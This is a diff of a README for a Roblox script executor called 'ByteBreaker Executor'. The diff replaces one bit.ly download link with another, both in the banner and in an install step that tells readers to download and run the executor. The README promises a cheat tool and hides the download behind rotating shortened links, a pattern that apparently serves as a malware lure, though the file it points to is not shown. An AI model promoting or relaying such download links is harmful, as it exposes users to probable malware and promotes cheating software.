@@ -520,7 +520,7 @@
 
 Welcome to the ByteBreaker Executor repository! 🚀 This repository hosts the latest version of the ByteBreaker Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![ByteBreaker Executor](https://bit.ly/4iazS1U)
+![ByteBreaker Executor](https://bit.ly/4g3xvfh)
 
 ## Table of Contents
 
@@ -1015,7 +1015,7 @@ ByteBreaker Executor is a cutting-edge executor designed for Roblox script execu
 
 To get started with ByteBreaker Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download ByteBreaker Executor](https://img.shields.io/badge/Download-ByteBreaker%20Executor-orange)](https://bit.ly/4iazS1U).
+1. Download the latest version of the executor from the following link: [![Download ByteBreaker Executor](https://img.shields.io/badge/Download-ByteBreaker%20Executor-orange)](https://bit.ly/4g3xvfh).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
